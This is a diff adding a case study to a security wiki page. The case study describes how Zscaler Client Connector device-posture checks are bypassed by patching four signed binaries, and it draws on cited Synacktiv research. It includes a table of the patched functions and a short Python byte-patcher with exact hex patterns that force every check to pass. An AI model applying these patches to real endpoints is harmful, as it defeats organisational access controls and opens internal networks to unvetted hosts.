@@ -677,7 +677,49 @@ Detection / Mitigation
 •  Monitor creations of new *kernel* services and alert when a driver is loaded from a world-writable directory or not present on the allow-list.
 •  Watch for user-mode handles to custom device objects followed by suspicious `DeviceIoControl` calls.
 
+### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching
+
+Zscaler’s **Client Connector** applies device-posture rules locally and relies on Windows RPC to communicate the results to other components. Two weak design choices make a full bypass possible:
+
+1. Posture evaluation happens **entirely client-side** (a boolean is sent to the server).
+2. Internal RPC endpoints only validate that the connecting executable is **signed by Zscaler** (via `WinVerifyTrust`).
+
+By **patching four signed binaries on disk** both mechanisms can be neutralised:
+
+| Binary | Original logic patched | Result |
+|--------|------------------------|---------|
+| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Always returns `1` so every check is compliant |
+| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ any (even unsigned) process can bind to the RPC pipes |
+| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Replaced by `mov eax,1 ; ret` |
+| `ZSATunnel.exe` | Integrity checks on the tunnel | Short-circuited |
+
+Minimal patcher excerpt:
+
+```python
+pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
+replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1
+
+with open("ZSATrayManager.exe", "r+b") as f:
+    data = f.read()
+    off = data.find(pattern)
+    if off == -1:
+        print("pattern not found")
+    else:
+        f.seek(off)
+        f.write(replacement)
+```
+
+After replacing the original files and restarting the service stack:
+
+* **All** posture checks display **green/compliant**.
+* Unsigned or modified binaries can open the named-pipe RPC endpoints (e.g. `\\RPC Control\\ZSATrayManager_talk_to_me`).
+* The compromised host gains unrestricted access to the internal network defined by the Zscaler policies.
+
+This case study demonstrates how purely client-side trust decisions and simple signature checks can be defeated with a few byte patches.
+
 ## References
+
+- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
 
 - [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
 {{#include ../banners/hacktricks-training.md}}
